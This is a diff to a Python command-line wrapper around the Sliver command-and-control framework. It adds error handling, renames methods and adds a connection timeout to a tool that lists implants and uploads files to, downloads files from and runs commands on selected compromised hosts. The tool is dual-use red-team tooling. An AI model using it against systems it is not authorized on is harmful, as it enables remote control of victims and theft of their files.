@@ -1,4 +1,5 @@
 import sliver, asyncio, aiofiles, inspect
+from grpc.aio import AioRpcError
 import argparse, yaml, shlex
 import sys, os
 from datetime import datetime, timezone
@@ -36,7 +37,6 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
 '''
     SELECT_MODE = 0
     INTERACT_MODE = 1
-    CMD_COMPLETER = WordCompleter(["help", "exit"])
 
     def __init__(self, client):
         self.client = client
@@ -45,6 +45,7 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
         self.targets = []
         self.interactions = []
         self.mode = self.SELECT_MODE
+        self.CMD_COMPLETER = WordCompleter(self.get_cmds())
 
     def info(self, msg):
         print(HTML(f'<ansigreen>[*]</ansigreen> {msg}'))
@@ -89,14 +90,14 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
                 implants = self.sessions
             case 'beacon':
                 implants = self.beacons
-            case 'interactive':
+            case 'interaction':
                 implants = self.interactions
             case _:
                 self.error('Unknown remote type')
                 return
         
         if len(implants) == 0:
-            self.info('None found 🙁')
+            self.info(f'No {type}s 🙁')
             return
         
         table = PrettyTable()
@@ -113,7 +114,7 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
         ]
         table.sortby = 'Remote Address'
 
-        if type == 'interactive':
+        if type == 'interaction':
             table.add_rows([
                 [
                     implant._session.ID[:8],
@@ -161,12 +162,15 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
     async def do_use(self, args):
         'Select targets'
 
-        # TODO: add a default/"Select all" option
+        if self.mode != self.SELECT_MODE:
+            self.error('Not in select mode')
+            return
         implants = self.get_implants()
         if len(implants) == 0:
             self.error('No implants found 🙁')
             return
 
+        # TODO: add a default/"Select all" option
         self.targets = inq.prompt([
             inq.Checkbox('targets', message='Select targets', choices=[
                 (f'{implant.RemoteAddress} ({type(implant).__name__.lower()})', implant) for implant in implants
@@ -205,10 +209,10 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
             self.error('Not in interactive mode')
             return
         
-        self.pretty_print_remotes('interactive')
+        self.pretty_print_remotes('interaction')
     
     async def do_upload(self, args):
-        'Upload a file to all target'
+        'Upload a file to all targets'
 
         if self.mode != self.INTERACT_MODE:
             self.error(html_escape('Not in interactive mode'))
@@ -235,20 +239,23 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
 
         async def process_download(interaction, filename):
             data = await interaction.download(filename)
-    
-            if data.Encoder == 'gzip':
-                gzip_data = data.Data
-                loop = asyncio.get_running_loop()
-                
-                # Decompress gzip data asynchronously
-                decompressed_data = await loop.run_in_executor(None, decompress_gzip, gzip_data)
-                
-                # Write the decompressed data asynchronously
-                output_filename = f'{interaction._session.RemoteAddress}-{os.path.basename(filename)}'
-                async with aiofiles.open(output_filename, 'wb') as f:
-                    await f.write(decompressed_data)
-            else:
-                print(f'Unsupported encoder: {data.Encoder}')
+
+            try:
+                if data.Encoder == 'gzip':
+                    gzip_data = data.Data
+                    loop = asyncio.get_running_loop()
+                    
+                    # Decompress gzip data asynchronously
+                    decompressed_data = await loop.run_in_executor(None, decompress_gzip, gzip_data)
+                    
+                    # Write the decompressed data asynchronously
+                    output_filename = f'{interaction._session.RemoteAddress}-{os.path.basename(filename)}'
+                    async with aiofiles.open(output_filename, 'wb') as f:
+                        await f.write(decompressed_data)
+                else:
+                    self.error(f'Unsupported encoder: {data.Encoder}')
+            except Exception as e:
+                self.error('An error occurred while downloading: ' + html_escape(str(e)))
 
         def decompress_gzip(gzip_data):
             with gzip.GzipFile(fileobj=io.BytesIO(gzip_data), mode="rb") as f:
@@ -281,8 +288,12 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
             return
         
         async def process_execute(interaction, args):
-            res = await interaction.execute(exe=args[0], args=args[1:], output=True)
             self.info(f'Output from {interaction._session.RemoteAddress}:')
+            try:
+                res = await interaction.execute(exe=args[0], args=args[1:], output=True)
+            except AioRpcError as e:
+                self.error(f'Error: ' + html_escape(e.details()))
+                return
             print(res.Stdout.decode())
         
         self.info(f'Executing command on selected targets\n')
@@ -326,7 +337,7 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
         prompt += '> '
         return HTML(prompt)
     
-    async def loop(self):
+    async def input_loop(self):
         print(ANSI(colored(self.BANNER, "blue")))   # HTML() doesn't like the backslashes
         update = asyncio.gather(self.client.sessions(), self.client.beacons())
         self.sessions, self.beacons = await update
@@ -349,14 +360,14 @@ _____   __ ___/  |_  ____  _____|  | |__|__  __ ___________
                         else:
                             c(cmd[1:])
                     except Exception as e:
-                        self.error(f'Error running command: {e}')
+                        self.error(f'An unknown error occurred: ' + html_escape(str(e)))
                 else:
                     self.error(f'Unknown command: {cmd[0]}')
         except KeyboardInterrupt:
             self.info("Exiting...\n")
             raise asyncio.CancelledError
 
-    async def update(self):
+    async def background_refresh(self):
         await asyncio.sleep(5)
         while True:
             async with asyncio.TaskGroup() as tg:
@@ -372,11 +383,19 @@ async def main():
     # Connect client to sliver server
     cli = AutoSliverCLI(client)
     cli.info('Connecting to sliver server...')
-    await client.connect()
+    try:
+        await asyncio.wait_for(client.connect(), timeout=10)
+    except asyncio.TimeoutError:
+        cli.error('Connection timed out')
+        sys.exit(0)
+    except Exception as e:
+        cli.error(f'Exception occurred: ' + html_escape(str(e)))
+        sys.exit(0)
+    
     cli.info('Connected!')
 
     try:
-        await asyncio.gather(cli.loop(), cli.update())
+        await asyncio.gather(cli.input_loop(), cli.background_refresh())
     except asyncio.CancelledError:
         sys.exit(0)
 
